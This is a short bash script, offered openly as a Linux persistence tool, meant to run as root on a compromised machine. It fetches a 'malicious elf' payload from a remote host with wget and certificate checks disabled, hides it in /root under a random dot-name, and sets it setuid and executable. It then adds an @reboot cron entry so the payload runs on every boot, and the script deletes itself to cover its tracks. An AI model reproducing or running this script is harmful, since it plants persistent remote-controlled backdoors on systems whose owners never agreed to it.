#/usr/bin/env bash
#
# calfcrusher@inventati.org
#
#
# A simple persistence script for Linux. Run it as root.
#
# Download elf payload and set cron persistence on reboot, then remove itself
#

# Check if script is running as root
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

# Save wget location
WGET=$(which wget)

# Url with payload to download
URL="https://192.168.1.7:8080/payload.elf"

# Randomize payload name
PAYLOAD=$RANDOM

# Add dot to make hidden file
PAYLOAD=".${PAYLOAD}"

# Download malicious elf
$WGET -q --no-check-certificate "${URL}" -O /root/$PAYLOAD

# Make suid executable :)
chmod u+s /root/$PAYLOAD
chmod +x /root/$PAYLOAD

# Persistence in crontab
crontab -l > temp_cron > /dev/null 2>&1
echo "@reboot sleep 30; /root/$PAYLOAD 2>&1" >> temp_cron
crontab temp_cron
rm temp_cron

# Remove itself (i don't use $0 because if invoked from shell will remove bash !
rm elf_crontab.sh
